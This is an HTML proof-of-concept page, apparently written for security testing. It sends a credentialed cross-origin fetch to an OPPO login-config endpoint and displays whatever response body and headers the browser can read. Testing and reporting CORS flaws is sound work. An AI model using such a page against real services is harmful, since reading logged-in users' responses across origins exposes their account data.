<!doctype html>
<html lang="id">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>CORS Security Validation</title>
  </head>
  <body>
    <h2>CORS PoC — OPPO Login Config</h2>
    <p>Pengujian keterbacaan response lintas origin.</p>
    <button id="run">Jalankan pemeriksaan</button>
    <pre id="result">Belum dijalankan.</pre>

    <script>
      const endpoint = "https://id-sg.oppo.com/identity/web/v1/config/login";

      document.getElementById("run").onclick = async () => {
        const output = document.getElementById("result");
        output.textContent = "Mengirim request...";

        try {
          const response = await fetch(endpoint, {
            method: "GET",
            credentials: "include",
          });

          const body = await response.text();

          // Ambil semua response headers yang bisa dibaca browser
          const headers = {};
          const targetHeaders = [
            "access-control-allow-origin",
            "access-control-allow-credentials",
            "access-control-allow-methods",
            "access-control-allow-headers",
            "content-type",
            "x-backend-host",
            "x-gateway-host",
            "server",
            "date",
          ];
          targetHeaders.forEach((key) => {
            const val = response.headers.get(key);
            if (val) headers[key] = val;
          });

          output.textContent = JSON.stringify(
            {
              browserCanReadResponse: true,
              status: response.status,
              responseHeaders: headers,
              responseLength: body.length,
              responseBody: body,
            },
            null,
            2,
          );
        } catch (error) {
          output.textContent = JSON.stringify(
            {
              browserCanReadResponse: false,
              error: String(error),
              hint: "Periksa DevTools Console dan Network.",
            },
            null,
            2,
          );
        }
      };
    </script>
  </body>
</html>
